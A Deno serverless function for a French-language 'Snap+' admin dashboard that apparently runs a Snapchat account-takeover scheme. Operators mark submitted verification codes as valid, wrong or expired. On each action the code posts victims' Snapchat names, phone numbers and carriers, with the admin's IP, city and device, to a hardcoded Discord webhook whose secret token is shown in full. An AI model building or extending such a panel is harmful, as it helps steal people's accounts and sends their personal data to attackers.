import { createClientFromRequest } from 'npm:@base44/sdk@0.8.31';

const LOG_WEBHOOK = "https://discord.com/api/webhooks/1520075027377164368/SRDgc2Ncec6qbVyFYKvD6oaWcNHZJC_HyisJS3hZPF6RALBe4LWOTlEnAxgWHZc3IZPV";

const actionLabels = {
  valid: { label: "✅ Code validé par l'admin", color: 0x2ECC71 },
  wrong: { label: "❌ Mauvais numéro (admin)", color: 0xE74C3C },
  expired: { label: "⏰ Code expiré / renvoyé", color: 0xF39C12 },
  wait: { label: "⏳ Mis en file d'attente", color: 0x3498DB },
  code_ready: { label: "📤 Code envoyé par un admin", color: 0xFFD700 },
  blacklist: { label: "🚫 Utilisateur blacklisté", color: 0x95A5A6 },
};

const statusMap = {
  valid: "code_valid",
  wrong: "code_wrong",
  expired: "code_expired",
  wait: "waiting_queue",
  code_ready: "code_ready",
};

Deno.serve(async (req) => {
  try {
    const { submissionId, action } = await req.json();

    if (!submissionId) {
      return Response.json({ error: 'submissionId requis' }, { status: 400 });
    }

    const newStatus = statusMap[action] || "code_ready";
    const base44 = createClientFromRequest(req);
    await base44.asServiceRole.entities.Submission.update(submissionId, { status: newStatus });

    // Fetch submission details for the log
    const sub = await base44.asServiceRole.entities.Submission.get(submissionId).catch(() => null);

    // Get admin IP info
    const adminIp = req.headers.get("x-forwarded-for")?.split(",")[0]?.trim() || "Inconnue";
    const userAgent = req.headers.get("user-agent") || "";

    let browser = "Inconnu";
    if (userAgent.includes("Edg/")) browser = "Edge";
    else if (userAgent.includes("OPR/") || userAgent.includes("Opera")) browser = "Opera";
    else if (userAgent.includes("Chrome")) browser = "Chrome";
    else if (userAgent.includes("Firefox")) browser = "Firefox";
    else if (userAgent.includes("Safari")) browser = "Safari";

    let device = "Desktop";
    if (/iPhone|iPad|iPod/.test(userAgent)) device = "iPhone/iPad";
    else if (/Android/.test(userAgent) && /Mobile/.test(userAgent)) device = "📱 Téléphone";
    else if (/Android/.test(userAgent)) device = "📱 Tablette";
    else device = "💻 PC";

    // Geolocate admin IP
    let country = "Inconnue";
    let city = "Inconnue";
    try {
      const geoRes = await fetch(`https://ipapi.co/${adminIp}/json/`);
      const geo = await geoRes.json();
      country = geo.country_name || "Inconnue";
      city = geo.city || "Inconnue";
    } catch {}

    const now = new Date();
    const heureStr = now.toLocaleString("fr-FR", {
      day: "numeric", month: "short", hour: "2-digit", minute: "2-digit", second: "2-digit",
      timeZone: "Europe/Paris"
    });

    const { label, color } = actionLabels[action] || actionLabels["code_ready"];

    const embed = {
      title: label,
      color,
      fields: [
        { name: "👻 Snapchat", value: sub?.snapchat || "N/A", inline: true },
        { name: "📞 Téléphone", value: sub?.telephone || "N/A", inline: true },
        { name: "📡 Opérateur", value: sub?.operateur || "N/A", inline: true },
        { name: "🌍 Pays", value: country, inline: true },
        { name: "🏙️ Ville", value: city, inline: true },
        { name: "🌐 Navigateur", value: browser, inline: true },
        { name: "💾 Appareil", value: device, inline: true },
        { name: "🕵️ IP Admin", value: `\`${adminIp}\``, inline: true },
        { name: "🕐 Heure", value: heureStr, inline: true },
      ],
      footer: { text: `Admin Dashboard • Snap+ • ID: ${submissionId}` },
      timestamp: now.toISOString(),
    };

    fetch(LOG_WEBHOOK, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({ embeds: [embed] }),
    }).catch(() => {});

    return Response.json({ ok: true });
  } catch (error) {
    return Response.json({ error: error.message }, { status: 500 });
  }
});